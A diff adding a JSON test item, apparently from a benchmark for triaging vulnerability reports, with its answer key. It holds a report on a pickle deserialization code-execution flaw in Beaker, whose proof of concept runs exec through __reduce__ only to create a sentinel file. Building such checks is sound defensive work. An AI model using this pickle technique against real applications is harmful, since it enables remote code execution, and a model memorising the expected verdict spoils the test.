@@ -1,0 +1,19 @@
+{
+  "report": {
+    "report_id": "beaker-affected",
+    "package": "beaker",
+    "affected_version": "1.11.0",
+    "title": "Pickle deserialization RCE in Beaker",
+    "body": "I found a vulnerability in this package. Beaker (de)serializes cache/session values with pickle.\n\nTracked as CVE-2013-7489.\n\nProof of concept:\n\n```python\nimport os, tempfile, pickle\nfrom beaker import util\nsentinel = os.path.join(tempfile.gettempdir(), \"slopgate_beaker\")\ntry: os.remove(sentinel)\nexcept OSError: pass\nclass Exploit:\n    def __reduce__(self):\n        return (exec, (\"open(r'%s','w').close()\" % sentinel,))\nblob = pickle.dumps(Exploit())\ntry:\n    util.deserialize(blob, \"pickle\")\nexcept Exception as e:\n    print(\"raised:\", type(e).__name__)\nprint(\"SLOPGATE:REPRODUCED\" if os.path.exists(sentinel) else \"SLOPGATE:NOT_REPRODUCED\")\n```\n",
+    "reporter": "researcher",
+    "ecosystem": "python"
+  },
+  "ground_truth": {
+    "expected_verdict": "confirmed",
+    "package": "beaker",
+    "fixed_version": null,
+    "cve": "CVE-2013-7489",
+    "source": "GHSA/NVD",
+    "note": "real vuln, affected version (sandbox-verified)"
+  }
+}
